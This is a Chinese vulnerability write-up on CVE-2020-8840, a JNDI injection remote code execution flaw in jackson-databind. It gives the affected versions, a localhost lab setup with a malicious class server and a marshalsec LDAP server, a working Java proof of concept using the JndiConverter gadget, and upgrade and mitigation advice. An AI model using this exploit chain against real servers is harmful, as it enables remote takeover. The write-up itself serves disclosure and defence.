# CVE-2020-8840：FasterXML/jackson-databind 远程代码执行漏洞

# 0x00 简介

    jackson-databind 是隶属 FasterXML 项目组下的JSON处理库。

# 0x01 漏洞概述

    2月19日，NVD发布安全通告披露了jackson-databind由JNDI注入导致的远程代码执行漏洞（CVE-2020-8840），CVSS评分为9.8 。受影响版本的jackson-databind中由于缺少某些xbean-reflect/JNDI黑名单类，如org.apache.xbean.propertyeditor.JndiConverter，可导致攻击者使用JNDI注入的方式实现远程代码执行，攻击成功可获得服务器的控制权限（Web服务等级）。

# 0x02 影响版本

2.0.0 <= FasterXML jackson-databind Version <= 2.9.10.2

# 0x03 环境搭建

- jdk版本：1.81 【使用ldap和rmi配合JNDI注入对对jdk版本有一定的要求。通过下图，我们可以清楚得知Oracle对其的修复时间。

![20190606014739_69118.jpg](images/20190606014739_69118.jpg)

1、在web服务器目录放上已经编译好的恶意类
![WX20200223-135435@2x.png](images/WX20200223-135435@2x.png)
这边使用simplehttp搭建web服务

```
python -m SimpleHTTPServer 8080
```


![image.png](images/1582437350957-9ff4e2c0-e2b8-4352-9160-1224b074b202.png)

2、启动ldap服务
这边使用的是marshalsec。github链接：[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8080/#Exploit
```

![image.png](images/1582437477649-8c75df78-c2df-416e-8a49-928d4eea738f.png)

3、建立一个java项目，导入存在漏洞版本的jar包
![WX20200223-135855@2x.png](images/WX20200223-135855@2x.png)

# 0x04 漏洞利用

- 整个漏洞利用链
```
poc --> ldap --> http
```

- poc
```
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class Poc {
    public static void main(String args[]) {
        ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();

        String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/Exploit\"}]";

        try {
            mapper.readValue(json, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
```

- 直接执行poc，通过ldap加载web服务器上的恶意类，导致远程代码执行

![WX20200223-140159@2x.png](images/WX20200223-140159@2x.png)

# 0x05 修复方式

1、升级 jackson-databind 至2.9.10.3、2.8.11.5、2.10.x
2、排查项目中是否使用 xbean-reflect。该次漏洞的核心原因是xbean-reflect 中存在特殊的利用链允许用户触发 JNDI 远程类加载操作。将xbean-reflect移除可以缓解漏洞所带来的影响。

# 参考链接：

[https://cert.360.cn/warning/detail?id=1fe3b5ea888750006e0d64fb0df1e6ee](https://cert.360.cn/warning/detail?id=1fe3b5ea888750006e0d64fb0df1e6ee)

[https://github.com/jas502n/CVE-2020-8840](https://github.com/jas502n/CVE-2020-8840)